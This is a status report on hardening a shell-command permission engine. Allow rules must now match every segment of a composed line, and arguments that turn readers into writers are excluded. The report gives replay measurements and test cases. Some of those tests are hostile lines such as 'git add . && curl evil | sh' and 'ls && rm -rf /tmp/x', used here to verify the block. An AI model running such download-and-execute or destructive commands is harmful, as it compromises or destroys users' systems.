# Status

## Done: an allow must cover the whole line

`pnpm check` green — 1139 tests, 8 of them new.

Two changes to `rules.ts`, and they answer different questions.

**`matches()` now requires every command on the line to satisfy an `allow`
rule.** Substitution and file redirection are refused before splitting;
`2>/dev/null` and `2>&1` are stripped first, because discarding output is how a
reader stays quiet and they appear all over the log. Only `allow` is affected —
a deny still matches inside a composition, or `rm -rf` would be reachable by
typing `&&`.

**`RuleMatch` gained `commandExcludePattern`**, for the arguments that turn a
reader into a writer: `find -delete/-exec/…`, `git branch -D/-m`, `sed -i`. A
second field rather than more regex in the first, because "what does this line
start with" and "what does it do" are different questions and cramming them
together is how the original rule became unreadable enough to hide this.

`sed`, `echo`, `sort` and `uniq` were added to the safe list. Not from taste: the
commonest inspection line in the log is `cat a; echo "=== b ==="; sed -n '1,40p' c`,
and `sed` is the command C-017's single real refusal tripped on. `awk` and
`xargs` were deliberately left out — `awk` writes files from inside its own
program text where no rule here can see it, and `xargs` runs whatever it is
given.

## The first version was wrong, and measuring is what said so

The first fix rejected **any** composed command line for an allow rule. It was
correct and it was unusable: measured over 490 inspection commands in the real
log, it turned **419 of them into cards**, overwhelmingly `cat … | head`.

A security fix that makes the ordinary case painful gets switched off, so that is
not a fix. Requiring every _segment_ to satisfy the rule keeps the pipelines of
readers and still refuses `git add . && curl evil | sh`, because `curl` is not
something `allow-local-git` covers.

|                                     | asks instead of allowing |
| ----------------------------------- | ------------------------ |
| reject any composed line            | 419 / 490 (86%)          |
| every segment must match            | 346 / 490 (71%)          |
| …plus `sed`, `echo`, `sort`, `uniq` | **296 / 490 (60%)**      |

## What did not change, which matters more than what did

**`trusted` is untouched: 5 of 35,223 commands in the log ask, and those 5 are
the universal asks that always did.** Its allow rule is `{ kind: 'command' }`
with no `commandPattern`, so none of this reaches it. Anyone working in trusted
sees no difference at all, which is the right outcome — trusted means the user
said so.

## Verified

The six lines from the board entry are pinned as tests that fail against the old
rule, alongside the cases the fix must **not** cost: `git status`, `ls -la`,
`cat README.md`, `rg needle src`, `find . -name x`, `git branch`. Two more guard
the edges — a universal deny still fires inside `ls && rm -rf /tmp/x`, and
`workspace-write` no longer allows `git add . && curl … | sh`, which was the same
hole one profile over.

## Not done

The remaining 60% are genuinely mixed lines — a `python3 -c "…"` after a `cat`,
or a quoted `|` inside a `grep` pattern — where asking is the right answer. It is
still a real change for anyone on `read-only`, and the open question in the plan
about whether that profile should be the default stands.

This was not driven in the running app. The change is pure policy with no UI, and
its behaviour is pinned by tests against the real engine plus a replay of 35,223
commands out of the log; a live run would have exercised the same function
through more layers.
